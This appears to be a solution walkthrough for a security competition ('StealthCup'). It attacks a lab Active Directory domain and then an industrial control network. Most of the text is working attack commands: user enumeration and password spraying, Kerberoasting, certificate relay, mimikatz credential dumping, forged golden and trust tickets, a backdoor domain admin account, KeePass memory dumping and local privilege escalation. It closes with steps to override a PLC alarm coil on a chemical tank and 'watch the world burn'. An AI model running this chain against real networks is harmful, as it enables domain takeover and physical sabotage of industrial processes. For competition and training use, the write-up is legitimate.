# Enterprise Environment

## ssh to kali box

```bash
nmap --open 10.0.0.0/24
curl http://10.0.0.12 2>&1 | grep 'plumetech'
echo 'martin\nalice\njack\nAdministrator' > users.txt
kerbrute userenum -d plumetech.local --dc 10.0.0.11 users.txt
kerbrute bruteuser -d plumetech.local --dc 10.0.0.11 ./2023-200_most_used_passwords.txt alice
bloodhound-python-ce -c all -d plumetech.local -u alice -p 'Demo@123' -ns 10.0.0.11
bloodhound-python-ce -c all -d plumetech-ou.local -u alice -p 'Demo@123' -ns 10.0.0.11
impacket-GetUserSPNs -dc-ip 10.0.0.11 'plumetech.local/alice:'Demo@123'' -outputfile ~/kerberoast.hashes
hashcat ~/kerberoast.hashes ~/rockyou.txt -O
certipy-ad find -u alice -p 'Demo@123' -dc-ip 10.0.0.11 -ns 10.0.0.11 -vulnerable
certipy-ad relay -target 10.0.0.11
certipy-ad auth -pfx nina.pfx -dc-ip 10.0.0.11
# deprecated RBCD abuse
# impacket-addcomputer -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host 10.0.0.11 -domain-netbios plumetech.local 'plumetech.local/alice:'Demo@123''
# certipy-ad auth -pfx nina.pfx -dc-ip 10.0.0.11 -ldap-shell
# set_rbcd CLI1$ ATTACKERSYSTEM$
# impacket-getST -spn 'cifs/cli1.plumetech.local' -impersonate 'Administrator' 'plumetech.local/attackersystem$:Summer2018!' -dc-ip 10.0.0.11
nxc smb 10.0.0.11 -u Alice -p 'Demo@123' --users
echo 'felix\nnina\nhelpdesk\ncarrie\ntracy\nhoward\ndominic\nsabrina\ntaylor\nfrank\nbackup' >> users.txt
kerbrute passwordspray --dc 10.0.1.11 -d plumetech.local users.txt servicemaster
```

## RDP to DC1

Copy mimikatz and Rubeus to share per RDP

```bash

mimikatz 'privilege::debug' log 'lsadump::lsa /inject' exit
# note rc4 of PLUMETECH-OT$ (trust key)

Rubeus.exe golden /domain:plumetech.local /sid:S-1-5-21-22011716-1179144206-3304708346 /sids:S-1-5-21-2969384189-1935569149-2846293003-1118 /rc4:a1f494c4c1d3f199412bcb418c79af2b /user:Administrator /outfile:ticket.kirbi
Rubeus.exe asktgs /ticket:C:\malware\trust.kirbi /service:http/otdc1.plumetech-ot.local /dc:otdc1.plumetech-ot.local /ptt /targetdomain
enter-pssession otdc1.plumetech-ot.local
  new-aduser temp
  set-adaccountpassword temp -reset
  set-aduser temp -Enable:$true
  add-adgroupmember -identity 'domain admins' -members temp
  exit
```

Background/Close RDP session with DC1

# OT Environment

## RDP to JUMP
as new domain admin; dump keepass.exe; analyze dump with keepass_password_dumper (found in StealthCup/scripts); open keepass in C:\Users\Bob\Desktop\keepass;
alternatively also do LPE before dumping keepass:

`sc C:\Scripts\backup.ps1 -value 'net localgroup Administrators jack@plumetech.local /add'`

RDP to ENG1 as local administrator found in keepass
- start codemeter license stuff and PLCEngineer
- unzip TCP 15 lib
- open project file
- load lib
- correct PLC address
- connect with admin:aa3975c8
- enable debug
- Open Code register in PLCNext > ESM  > Main Task > Chem_Tank_control
- double-click FALSE next to xAlarmOverrideCoils[5] and set it to TRUE
- open browser and browse to scada.plumetech-ot.local
- login with creds found in \\otdc1.plumetech-ot.local\OT ?  admin:49b0EEl6fr32F4ad7GVU
- crank up the pump and watch the world burn

Alternative solution:
- ssh to admin@10.0.1.45 with Uk2PnvDVLBQmUlAAiCiMLIaVyyHlDX
- execute python script from simon (found in StealthCup/scripts/writecoil.py)
`python3 writecoil.py'
- follow steps above starting from scada web panel 